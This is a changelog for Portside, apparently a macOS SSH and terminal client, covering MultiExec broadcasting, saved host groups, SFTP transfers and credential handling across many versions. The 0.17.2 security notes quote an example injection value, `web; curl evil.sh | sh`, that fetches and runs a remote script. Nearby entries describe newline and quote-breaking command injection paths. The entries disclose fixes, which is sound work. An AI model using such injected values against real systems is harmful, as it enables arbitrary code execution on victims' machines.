# Changelog

All notable changes to Portside are documented here, newest first. This file
also feeds the in-app update changelog — see `Scripts/release.sh`.

## 0.22.0

**Tabs and panes can be dragged into order.** Drag a tab onto another to move it there, or past the last one to send it to the end — useful when old and new servers want to sit apart. In Grid View, drag a pane's grip onto another pane and the two swap places; the grid is a seating chart rather than a list, so nothing else shifts around. Rearranging the grid rearranges the tabs underneath it, so leaving Grid View hands them back in the order you arranged.

## 0.21.1

**Moving hosts between folders always redraws the sidebar.** Moving a selection into a folder sometimes left the sidebar showing them where they used to be, until a relaunch — the library on disk was already correct. The outline skips rebuilding when a fingerprint of the tree hasn't changed, and that fingerprint didn't record which folder a row was in: dragging hosts from a folder into an empty subfolder of it, or out to the top level, produced a byte-identical fingerprint and so no redraw. The transport badge (mosh, serial, unencrypted) had the same gap and would have gone stale the same way.

**Folders count their groups.** A folder's badge in the sidebar counted hosts only, so a folder created to hold groups showed no number at all — indistinguishable from an empty one. It now counts everything a folder holds, hosts and groups alike, through its subfolders as before.

## 0.21.0

**Groups grow up.** Saved groups can now live in folders, be starred, and be opened from ⌘K — three gaps that didn't matter with two groups and matter a great deal with a dozen.

Filing: groups can be dragged into folders like hosts, the save sheet gains a folder field, and a group's context menu offers "Move to". All three were missing, so every group sat at the top level however many you saved. Renaming or deleting a folder now takes its groups with it, rather than leaving them pointing at a path nothing else referenced.

Favorites: star a group from its sidebar row or its context menu and it appears in a **Groups** section on the welcome screen, alongside your favorite hosts. The field had shipped on the model since groups arrived and nothing could set it.

Quick Connect: ⌘K now searches groups as well as hosts, showing the pane count and folder. Hosts and groups compete on the same score, but with an empty query groups sit below the recents — ⌘K then Return is still the fast reconnect it was.

**Deleting is undoable.** Edit ▸ Undo Delete (⌥⌘Z) takes back the last delete — a host, a group, a macro, or a whole mixed selection as one action — and Recently Deleted reaches past it to a specific one. Both name what would come back. A restored host returns to the folder it was in, even if deleting it was what emptied that folder.

Recently Deleted and Recently Closed now say *when* — "web-01 · 2 minutes ago" — since a name alone doesn't tell you which of two identically-named entries you're about to bring back. Clear Recently Deleted forgets the undoable deletes, which is also how you finish one off immediately rather than waiting for it to age out.

A deleted host keeps its saved password for as long as the delete can still be taken back. Removing it immediately would mean undo restored a host that looked right and then couldn't authenticate; holding the plaintext somewhere to write back later would move a secret out of the Keychain. Instead the Keychain item simply outlives the delete by exactly the undo window, and Portside sweeps up any left behind by a crash at the next launch.

**Opening a group you already have open** brings that tab forward instead of opening a second copy. Two tabs for one group didn't just clutter the bar: closing a group tab writes its arrangement back, so duplicates competed and whichever you closed last silently overwrote the other's layout.

**The MultiExec disarm notice belongs to the tab that disarmed.** It used to be app-wide, so one tab going down put "MultiExec disarmed" on every tab — including ones that had never been armed. A tab you were nowhere near announcing something that didn't happen to you is worse than no notice at all. Re-arming clears it, too.

## 0.20.0

**Saved host groups.** Save the panes in a tab as a named group — "Splunk Servers", the eight boxes you always open together — and reopen the whole arrangement with one click. Groups live in the sidebar in their folder, above the hosts, with a pane count; double-click opens, and the context menu offers rename and delete. Save from File ▸ Save Tab as Group…, from the tab's own context menu, or from a button on the MultiExec banner, since assembling a group and arming it are usually the same motion. A tab opened from a group takes the group's name, and rearranging it saves back silently when you close the tab or quit — no "remember to save" step. A group whose hosts you've since deleted opens the ones that remain and says which are gone, rather than quietly giving you a smaller grid than you asked for. Groups always open **disarmed**: assembled and ready, with arming still a deliberate act.

**MultiExec now confirms a paste that fans out.** Typing is self-limiting — a mistake is one keystroke wide and you watch it land. Pasting is the opposite: a lot of already-committed input arriving at once, on every included host simultaneously, with no keystroke-by-keystroke feedback to catch it partway. A multi-command or large paste into an armed group now asks first, naming every host it would reach and showing what would run. Return cancels rather than confirms, so the reflex that got you there can't approve it. A single command pastes without asking — that's the shape of nearly every useful paste, and prompting on it would only train the confirmation away.

**MultiExec disarms itself when the world changes underneath it.** Arming asserts "these panes are in a state I've checked". Three things invalidate the checked half, and each now takes the broadcast down and says why: a pane reconnecting (its shell is fresh, possibly at a login prompt, possibly on a different machine if DNS moved), the Mac waking from sleep (everything on the other side had unbounded time to change), and the network changing (a jump host can resolve somewhere else entirely from a different network, while established connections look untouched). Pane membership survives, so re-arming brings the same group straight back. The network rule keys on the interfaces actually carrying traffic rather than on reachability, so a brief Wi-Fi drop on the way back to the same network doesn't trigger it — a guardrail that fires during ordinary work is one people learn to route around.

**Fixed: a run-on-connect command could be typed into a password prompt.** It fired on a fixed 1.2-second timer, which is long enough for a fast local shell and nowhere near long enough for a password prompt, a slow `ProxyJump` chain, or MFA. When it lost that race the command went *into* the prompt — echo is off so nothing appears, the newline submits it as the password, and the command is sent to the server as a failed credential and written to its auth log. It now waits for whatever is asking for a secret to finish, detected from the terminal's echo state rather than by guessing at prompt wording, with a ninety-second ceiling that covers approving a push or touching a hardware key.

**Fixed: a remote filename containing a line break could forge an SFTP command.** Paths were quoted before going into an `sftp` batch, which protects the argument — but a batch is newline-delimited, so a name containing a carriage return or line feed split one intended command into two, and the second half was whatever the filename said. `rm` is among the commands that could be forged that way. Such names can't survive a directory listing either, so they're now rejected at the boundary with a clear message rather than quietly doing something else. Spaces, quotes, backslashes and non-ASCII are unaffected.

**Fixed: a library restored on another Mac couldn't authenticate — anywhere.** Exports carried hosts, folders and macros but not credential profiles, so every restored session referenced a profile that didn't exist on the receiving machine, silently resolving to no credential at all. Profile *definitions* now travel (name, user, identity file — never the password, which stays in the Keychain and is re-entered once per Mac). A profile that already exists here keeps its own password rather than being overwritten, and one that exists under the same name but a different id is matched up instead of being duplicated.

**Fixed: importing a file that listed the same host twice added it twice.** Duplicates were checked against the library but not against the rest of the incoming batch, so a session or macro repeated inside one file got through as many times as it appeared.

**Your session library no longer gets rewritten every time you touch a tab.** Opening, closing, splitting or switching tabs used to rewrite the whole thing — every host, folder, macro, group and credential profile — just to record which tabs were open. Window state, appearance, terminal settings and recents now live in `portside.local.json` beside it, migrated across automatically on first launch. The library is what you'd back up, share, or put in a synced folder; the sidecar is this Mac's window and font size, and losing it costs you nothing but a layout. Related: Portside now refuses to save over a library that changed on disk since it read it — another copy of Portside, or a sync client bringing down edits from a second Mac — and offers to reload or overwrite instead of silently discarding the other change.

**Fixed: recording a command rewrote the entire history file.** Every command re-encoded connection stats, the log, and up to 5,000 command lines, then replaced the file — so one MultiExec broadcast across a grid meant one full rewrite per pane. Writes are coalesced into a bounded window now (a long stream of commands can't postpone them indefinitely, which is when there'd be most to lose), and quitting flushes whatever is outstanding. Clearing history still writes immediately.

**Tab names make more sense.** A tab opened from a group is named after the group rather than after whichever host happened to be first in it. Renaming a tab now survives MultiExec gathering it into a grid, which used to silently revert it. A multi-pane tab reads as "turing +2" rather than just naming one of its panes, and no longer changes name as you click between panes.

Under the hood: building from source no longer nags about updates it has no feed for, and `PORTSIDE_LIBRARY_DIR` runs a development build against a throwaway library instead of your real one. CI now ratchets the Swift 6 strict-concurrency warning count per file so it can shrink but never grow; this release takes it from 248 to 168, largely by moving the sidebar and session machinery onto the main actor.

## 0.19.0

- **Copy a file straight from one host to another** — drag it out of the SFTP browser and drop it on a different pane. It lands in whatever directory that pane's shell is currently sitting in, so where you're standing is where the file arrives. Drop it on a pane that's **broadcasting** and it goes to every host in the MultiExec group at once; a file dragged in from Finder follows the same rule, which previously meant uploading it to one host and dragging it back out to the rest. The bytes relay through a staging file on the Mac — there's no safe direct host-to-host path that doesn't involve trusting one box with credentials for another — but it's downloaded only *once* however many hosts receive it, and uploaded to several at a time. That cap is in Settings ▸ Connection ▸ File Transfers, defaulting to 4: raising it mostly stops one slow host holding up the group rather than making the whole copy faster, and 1 is a fair choice if you'd rather each host finished before the next began. Hovering a broadcasting pane lights up every pane in the group, so you can see where a file is going before you let go, and each pane flashes as its own copy lands. Progress, including which host is being written to and a Cancel button, shows on the MultiExec banner.
- Fixed: **a corrupted or malicious escape sequence could silently truncate a session transcript.** The stripper that keeps logs greppable had no way out of a sequence that never ended — one malformed OSC swallowed every byte after it, so the log just stopped, with nothing in it to say why. It now honours the standard cancellation controls, accepts both spellings of the string terminator, and gives up on any sequence past 4 MiB. Status and privacy messages are no longer dumped into the transcript as text. Separately, closing a tab could drop the transcript's final lines and its "session ended" footer.
- Fixed: **the file browser opened in the wrong directory** for any host you'd already `cd`-ed somewhere. It's created the first time you show it, and it opened at the SSH login home while ignoring where the shell had told us it actually was — and refreshing couldn't recover, since refresh reloads the directory it's on. A browser opened *before* you moved worked fine, which is what made it look intermittent.
- Fixed: **the file browser couldn't be opened while MultiExec was armed.** The folder button was disabled for armed tabs, left over from when an armed tab was a separate grid mode with no single session to browse.
- Fixed: **an interrupted upload left a partial file wearing the real filename**, which the overwrite check would then refuse to replace on the retry — so recovering meant deleting it by hand. Uploads now write under a temporary name and move into place only once complete.
- `SECURITY.md` no longer claims passwords are never written to disk. They're in the Keychain, but one is briefly written to a mode-`0600` temporary file when it has to be handed to `ssh`; that's now stated plainly rather than glossed.

## 0.18.1

- Fixed: **a command typed after Invert Selection could go to one host instead of the group.** Excluding a pane never stopped it receiving your keystrokes — only the *mirror* to its peers — so if a bulk action excluded the pane that happened to hold focus, the caret stayed in what was now a private session and the next command ran on that single host. Invert Selection made this easy to hit: exclude two of six, invert, and the pane you were typing in was suddenly the excluded one. Focus now moves to the first pane still broadcasting whenever an exclusion takes the broadcast out from under it, whether from a bulk action or ⌥⌘M. Deliberately typing into an excluded pane still works — click into it first; what's gone is landing there without asking.

## 0.18.0

- **Temporarily drop a host out of a MultiExec broadcast, then put it back** — MobaXterm's per-host checkbox. Run a command against everything but two boxes, then put them back, without disarming. Every pane has always had an include toggle while MultiExec is armed, but it was a floating chip that covered the terminal's top line, labelled with a host title the pane's own prompt already showed. It's now a status bar under each pane reading **Broadcasting** or **Excluded**, clickable across its full width. The armed banner counts included panes and carries one-click **Include All**, **Exclude All** and **Invert Selection** buttons, each greyed out when it would do nothing. Everything has a key: **⌥⌘M** toggles the focused pane, **⌥⌘A** / **⌥⌘E** / **⌥⌘I** run the three bulk actions, and ⇧⌘M still disarms — all rebindable in Settings ▸ Shortcuts, and all mirrored under View ▸ MultiExec Panes. Protected hosts still only join through their confirmation: no bulk action can sweep one in.
- Fixed: **⇧⌘M could not arm MultiExec from several single-host tabs** — the exact case it gathers into Grid View for. The menu item was disabled unless the *current tab* already had 2+ panes, a condition the toolbar button didn't share, so the keyboard shortcut was dead where the toolbar toggle worked.

## 0.17.2

Security and data-integrity patch, from a full codebase review — nothing here was exploited in the wild, but several of these were reachable just by importing a crafted library or browsing an SFTP directory.

- Fixed: **an imported container, Kubernetes, or mosh session could run arbitrary commands on connect.** Container/pod exec strings were built by joining untrusted fields (name, namespace, context) with plain spaces before typing the result into the shell that came up — a crafted container name like `web; curl evil.sh | sh` ran the second command the moment you connected, locally or on the far side over SSH. mosh had a parallel bug: the identity path was wrapped in hand-written single quotes that an apostrophe could break out of, letting mosh's own word-splitting inject extra SSH options. Every field now goes through the same shell-quoting library the container browser already used, with control characters stripped and flag-like values rejected outright.
- Fixed: **double-clicking a remote file to edit it could hand a downloaded script straight to Terminal.** `sftp get` preserves the remote file's mode, and with no preferred editor set, "Edit" fell through to whatever macOS associates with the file's type — a `.command` script arrived executable, unquarantined, and ready to run. "Edit" now always opens in an actual text editor (never the system-default handler), and every checkout has its executable bit stripped and a quarantine attribute applied, same as a browser download.
- Fixed: **Save To… and Downloads could delete or truncate a file that was already there.** Both downloaded straight to the final destination; cancelling mid-transfer deleted whatever had existed before, and any other failure could leave a half-written file wearing the real name. Downloads now land in a hidden staging file next to the destination and are only moved into place once the transfer actually succeeds.
- Fixed: **saving a remote file, or dragging one in, could silently overwrite a change made elsewhere.** Remote Edit uploaded straight over the live file with no check that it still matched what was checked out — a concurrent edit from another admin or tool was simply lost, and an interrupted upload could leave a partial file in place. Saves now compare the remote file's size and modification time against the checkout snapshot and refuse rather than clobber if it's changed, and the upload itself goes through a temp-name-then-rename swap (atomic on OpenSSH servers) with the original file's permissions restored afterward. Dragging a file onto an SFTP pane no longer overwrites a same-named remote file without telling you.
- Fixed: **the transcript folder in Settings ▸ Recording could reach files Portside never created.** Log maintenance recursively gzipped (and log search read) every `.log` under that directory purely by extension — picking Documents, or any existing log tree, as the folder meant those files were fair game too. Both are now scoped to exactly the `<host>/<host>_<timestamp>.log` shape Portside itself generates, and search caps how much of a file it reads into memory so a corrupted or adversarial `.log.gz` can't be used as a decompression bomb.
- Fixed: **a release's published tag could point at different code than what was actually built**, if `origin` advanced during the build/notarization wait and the fetch used to verify it had failed silently. The fetch failure is now fatal, the tag is pinned to the exact verified commit, and it's read back from GitHub and checked before the script finishes. Releases also now ship a `SHA256SUMS.txt`.
- Deleting a host now removes its saved Keychain password too — context-menu and bulk deletion used to leave it behind indefinitely, since only the session editor's own Delete button happened to clean it up. A stale askpass temp directory (left by a crash or force-quit skipping normal cleanup) is now purged at launch, and the SSH control-socket directory is per-user and verified before use rather than a single shared, unverified `/tmp` path.

## 0.17.1

- Fixed: the **Profiles settings tab was unreadable** if you had any credential profiles saved — sized to 152 points against Appearance's 993, showing a header and half a row, with scrolling no help. `CredentialProfilesView` is built on `List`, which is lazy and reports no intrinsic height, so the measurement that sizes each tab came back with its bare minimum. Settings pages now have a floor, which also covers any future page built the same way. An empty Profiles tab draws an empty state that *does* report a height, which is why 0.17.0 shipped with this.

## 0.17.0

Polish and appearance — plus a crash that could take the app down from ordinary remote output.

- **App appearance** (Settings ▸ Appearance): light, dark, or follow-system for the sidebar, tabs and panels — deliberately independent of the terminal's own colour theme, so a dark terminal in a light app stays possible.
- **Inline images work, and always did.** Sixel, iTerm2 (OSC 1337) and Kitty graphics all render — `imgcat` a screenshot or a Grafana export from a remote host instead of copying it back first. The compatibility matrix had listed them as unsupported since the SwiftTerm 1.x upgrade; it was measured against a pre-1.0 version and never re-checked. `docs/demo/portside-logo.six` is a Sixel of the app icon you can `cat` to try it.
- **Browsable recently-closed tabs**: File ▸ Recently Closed reopens any of the last ten, not just the most recent. Kept in memory only — it's a record of what infrastructure you had open — and clearable on demand.
- **⌘W closes the tab**, the convention Terminal.app and iTerm2 use. There was previously no way to close a tab from the keyboard or the menu bar at all. ⇧⌘W stays Close Pane.
- **Favourite macros**, pinned to the MultiExec bar. With a long macro library the bar ran off the edge of the window; it now shows what you've pinned, and scrolls visibly when it still doesn't fit.
- **A "never connected" category** in Coverage, distinct from hosts that have gone stale — an import nobody has verified and drift are opposite problems. Reported, not scored, so 100% stays reachable.
- **New Local Shell** from the Hosts section's "+" menu, where people actually are.
- **Settings windows size to their content**, instead of inheriting the previous tab's height, and cap to the screen with the page scrolling when it doesn't fit.
- One empty state across the app, each saying what would fill the view rather than only that it's empty.
- Fixed: **a malformed Sixel image could crash Portside** — a `fatalError` inside SwiftTerm's decoder, reachable from ordinary output arriving over SSH with no user action. Portside now repairs the affected images as they arrive. Fixed upstream too, in a SwiftTerm release that doesn't exist yet.
- Fixed: **installing bash shell integration broke SFTP on that host** (`Received message too long`). The snippet set a `DEBUG` trap without guarding for interactive shells, so it emitted escape sequences into non-interactive sessions and corrupted the binary protocol. Re-running the install repairs an affected host.
- Fixed: **macros imported from MobaXterm lost characters.** Spaces became the literal word `SPACE`, and quotes, pipes, semicolons, equals and colons arrived as `__DBLQUO__`-style escapes. `Scripts/repair_moba_macros.py` fixes macros already in your library — re-importing does not, since import skips macros whose name already exists.
- Fixed: the coverage view treated an empty library and a fully-covered one as the same thing, and the file browser called a directory of dotfiles "empty".

## 0.16.0

Fleet management and history: see what your library doesn't say about your hosts, and what you actually ran.

- **Inventory coverage** (Tools ▸ Coverage): which hosts have no environment tag, no credential profile, or no stored credentials — with bulk fixes in place, so a pass across a large imported library can be verified rather than guessed at. Framed as coverage, not errors: a host authenticating through ssh-agent is fine, and each finding says when it doesn't matter.
- **Bulk-tag environment** across a multi-selection or a whole folder, alongside the existing bulk credential-profile action.
- **Expand / Collapse All folders**, globally from the toolbar and View menu, or scoped to one folder's branch from its right-click menu.
- **Connection history**: per-host totals are kept automatically and now rank Quick Connect by *frecency* — a host you use constantly outranks one touched once yesterday. Hosts you haven't connected to in a while are surfaced in Coverage.
- **Command history** (opt-in): with shell integration installed, Portside records each command, when it ran, how long it took, and whether it succeeded. Selecting one shows the surrounding session transcript, so history works as a table of contents for your logs.
- **History browser** (Tools ▸ History): commands, per-host totals, and — with the optional full log on — every connection attempt with its outcome, including failures.
- **Settings ▸ Recording** replaces the separate Logging and History panes: transcripts, connection history, and command history in one place, with one privacy rule that now covers all three. Session transcripts previously ignored the protected-host exclusion.
- The sidebar's "+" menu is creation only; import/export moved to a new Library menu beside it and to the File menu, with Expand/Collapse in View.
- Fixed: failed connection attempts were counted as successful ones, inflating a host's totals and preventing it from ever showing as stale.
- Fixed: Kubernetes context and namespace were interpolated into a shell command, so an imported session library could run arbitrary commands when browsing pods.
- Fixed: a session library that couldn't be read was replaced by a fresh one seeded from `~/.ssh/config`. It's now preserved untouched, and Portside tells you where the copy is rather than saving over it.
- Fixed: port-forward tunnels ignored credential-profile passwords, so tunnels to hosts using a shared or default profile failed to authenticate.

**Portside is Apple silicon only.** Intel Macs aren't supported; if that matters to you, please open an issue.

## 0.15.0

Edit remote files in your own editor, and see every transfer.

- **Remote file editing**: double-click a file in the SFTP browser and it opens in whatever app you'd normally use, with every save uploaded straight back to the host — no manual download, edit, re-upload. It's a private local copy rather than a live mount, but the round trip is invisible. The browser shows what's checked out and when it last saved.
- **Choose the editor**: right-click ▸ "Edit With" lists the apps that can open the file, and Settings ▸ Connection sets a preferred editor for all remote files. Plain-text editors are always offered, since `.conf`/`.yml` are often registered to nothing useful and files like `authorized_keys` or `motd` have no file type to look up at all.
- **Every transfer is now visible and cancellable** — downloads, uploads, drag-out and the editing round trip all report progress and can be stopped mid-flight. Previously a transfer could not be called off once started.
- **Dragging a file out writes it straight to where you drop it**, instead of downloading to a temporary copy and then copying it again. A large file now appears at the destination immediately and grows there, at half the disk and roughly half the time.
- Files larger than 10 MB ask before being opened for editing, and protected hosts confirm before a file is checked out — every save writes back to a live server.
- New "Save To…" in the file browser's right-click menu, for downloading somewhere other than ~/Downloads.
- Clicking a file in the browser now highlights it.

## 0.14.0

Named credential profiles, pinned favorites, and a cumulative changelog on update.

- **Credential profiles** (Settings ▸ Profiles): reusable identities (user, SSH key, and/or password) applied in bulk to a multi-selection or a whole folder. A host holds a *live* reference to its assigned profile — rotating a profile's password or key updates every host using it immediately. The old single default password folds into this as the first profile ("Default").
- **Favorites**: pin hosts from a sidebar right-click (single or multi-selection), a hover star icon on each sidebar row, or a toggle in the session editor. Favorites show on the welcome/start page alongside "Jump back in," hidden while actively searching.
- Update prompts now show a cumulative changelog covering everything since the version you're updating from, not just the latest release's own notes — useful since auto-updaters often jump several versions at once.

## 0.13.0

SFTP polish, MultiExec one-step, and host key auto-accept.

- SFTP: auto-refresh on host switch, delete confirmation, a persistent drag/drop hint, and cd-following via OSC 7 for bash/zsh — one-click "Install Shell Integration" (idempotent remote append + optional immediate source) with automatic shell detection.
- MultiExec is one step: arming it gathers separate tabs into Grid View automatically if needed.
- Fixed toolbar tooltips (Files/Grid View/MultiExec), a Grid View restore bug, and the start-page tab's content not updating after connecting.
- Arrow-key navigation + Enter-to-launch in the welcome-screen search and the sidebar host filter.
- New: 'R' reconnects a dropped session; an optional "automatically accept new host keys" toggle (Settings ▸ Connection) that only skips the first-connection prompt, not protection against a known host's key changing later.
- Bigger, reliable click targets on the tab bar's + button and scroll chevrons.

## 0.12.0

Tab overflow scrolling, remappable shortcuts, and credential fixes.

- Tab strip grows </> chevrons to page through when tabs overflow the window.
- Every keyboard shortcut is remappable (Settings ▸ Shortcuts) with a click-to-record recorder, conflict detection, and reset to defaults. New shortcuts: Reopen Closed Tab (⇧⌘T), Toggle MultiExec (⇧⌘M), Toggle Grid View (⇧⌘G), Clear Buffer (⌘⌫), plus a ⌘←/⌘→ tab-cycling alias.
- Fixed a real bug where saved passwords could silently fail to write to the Keychain with no error shown.
- New app-wide default password (Settings ▸ Connection) as a fallback for hosts that opt in to saved passwords but don't have one of their own — pairs with the bulk "Save Password in Keychain" sidebar action.
- New Settings ▸ Updates: toggle automatic update checks, pick the interval, see last-checked time, check now.

## 0.11.0

Cursor styling, tab duplicate, smarter search, a real start page, and terminal right-click.

- Cursor shape (block/underline/bar) and blink, configurable in Settings ▸ Appearance, with a live preview.
- Duplicate Tab: right-click any tab to reopen its same host(s)/layout as a fresh tab.
- Sidebar host search now auto-expands folders containing matches.
- The tab bar's + button opens a "Welcome aboard" start page with a host search bar instead of a local shell; picking a host or a local shell from it takes over that same tab.
- Right-click inside a terminal for Copy/Paste.
- Fixed: dragging the window by its titlebar could hijack terminal scroll (jumping to the top and fighting further scrolling) and start a phantom selection.
- New Settings ▸ Connection option to default new sessions to "Save password in Keychain", plus a sidebar bulk action to enable it across an existing selection of hosts.

## 0.10.0

Terminal & tab polish.

- Keyboard tab switching: ⌘⇧[ / ⌘⇧] to cycle, ⌘1–9 to jump (Window menu).
- Pane zoom: ⌘⇧↵ maximizes the active pane to fill its tab and toggles back to the split.
- Reconnect in place: the "Session ended" bar can relaunch a dropped session in the same pane, keeping your layout.
- Tab bar: right-click a tab for Rename / Close / Close Others, plus a "+" new-tab button; background tabs show a dot when they have new output.
- Configurable alert color: set the MultiExec banner/border color in Settings ▸ Appearance ▸ Alert Color.

## 0.9.2

Bug fix: switching tabs now correctly changes the terminal shown.

A regression from the 0.9 split-panes work left a single-tab switch showing the previously selected session's terminal (splits and the grid were unaffected). Fixed.

## 0.9.1

Grid View — tile every open session into one grid to watch them at once, then arm MultiExec to broadcast across them.

- New Grid View toolbar button (⊞) gathers your open tabs into a tiled grid; toggle it off to split back into tabs. This restores the classic "group several sessions and drive them together" flow that 0.9.0's per-tab MultiExec had narrowed.
- MultiExec (broadcast) now enables only when a tab has 2+ panes, pointing you to Grid View first when your sessions are in separate tabs.

## 0.9.0

Native split panes.

- Split any tab with ⌘D (right) / ⌘⇧D (down); each new pane opens a local shell. Move focus by click or ⌘⌥←/→, close a pane with ⌘⇧W.
- MultiExec now lives in the split: arm a tab to broadcast keystrokes across its panes, with per-pane opt-in, protected-host guardrails, and the loud armed banner. Open a folder of hosts straight into an armed grid.
- Session restore reopens your whole pane layout, not just the tabs.
- A dead session now closes on ⏎ or a second ⌃D (MobaXterm-style).

## 0.8.0

Two big library/workspace features:

- Native Hosts sidebar (NSOutlineView): shift-click ranges, ⌘-click, and full keyboard multi-selection, plus drag hosts (single or multi) between folders.
- Session restore: reopen the tabs you had open when you last quit — Settings ▸ Terminal (off / ask / auto, default ask). Hosts reconnect, local shells start fresh, and MultiExec groups reopen disarmed so a relaunch never auto-broadcasts.
- Also enables GPU (Metal) rendering in packaged builds.

## 0.7.3

Enables Metal (GPU) rendering in packaged builds — our upstream fix for the SwiftTerm shader-bundle crash shipped in 1.15.0. Previously the Metal toggle silently stayed on CoreGraphics outside dev builds; it now works end-to-end.

## 0.7.2

Fixes last line truncated when returning to a session, and drag-to-select now auto-scrolls past the visible viewport.

## 0.7.1

Fixes a crash when opening Settings (resource bundle lookup failed on any machine other than the build machine). Also guards the experimental Metal renderer against the same crash; it stays on the standard renderer in packaged builds for now.

## 0.7.0

Configurable scrollback (default 10,000 lines), opt-in GPU (Metal) rendering, and a tested terminal-compatibility matrix. Fixes mosh's first connection on macOS by declaring Local Network usage. First release to ship a drag-to-install DMG alongside the ZIP.
